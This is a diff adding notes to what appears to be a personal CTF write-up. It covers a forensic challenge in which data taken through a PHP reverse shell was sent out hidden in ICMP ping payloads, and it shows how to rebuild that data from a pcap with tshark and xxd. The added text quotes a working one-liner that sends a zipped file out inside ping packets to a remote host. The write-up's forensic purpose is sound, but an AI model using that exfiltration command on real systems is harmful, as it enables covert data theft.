@@ -26,4 +26,20 @@ HTB{b1tbuck3t5_publ1c_r3p0s_g0_brrr!!}
 
 # So,Find to which port the tcp connections is open
 
-# 
+# Another Challenge ->
+1. Using a PHP reverse shell, get access to a machine. 
+2. Run commands, get a pdf, zip it with password protection
+3. Convert to post script hexadump and send it to a remote server along with PING data. Using padding.
+$ zip -P Im4H4ck3rL0rd somereport.zip somereport.pdf
+  adding: ConfidentialReport.pdf (deflated 2%)
+$ xxd -ps -c 14 somereport.zip | while read i; do ping -c 1 -s `echo ${#i}/2 | bc` -p $i 192.168.127.1; done >/dev/null 2>&1  # code to use ping to send data
+
+How to solve? -> They gave a pcap file. 
+Analyse the PCAP, follow all tcp/http stream "tcp.stream eq 1" till the last "tcp.stream eq 10" 
+You will understand steps 1 to 3. 
+Collect all the PING data and reconstruct the file.
+tshark -r capture.pcap -Y "icmp" -T fields -e data > hexadump.file # to get data from icmp ping request
+uniq hexadump.file > hexadump_uniq.file # because it has both request and reply, however both will be same. dont use sort -u. The order will be messed up.
+xxd -r -p hexadump_uniq.file output.zip
+unzip output.zip -> The pdf had the flag.
+
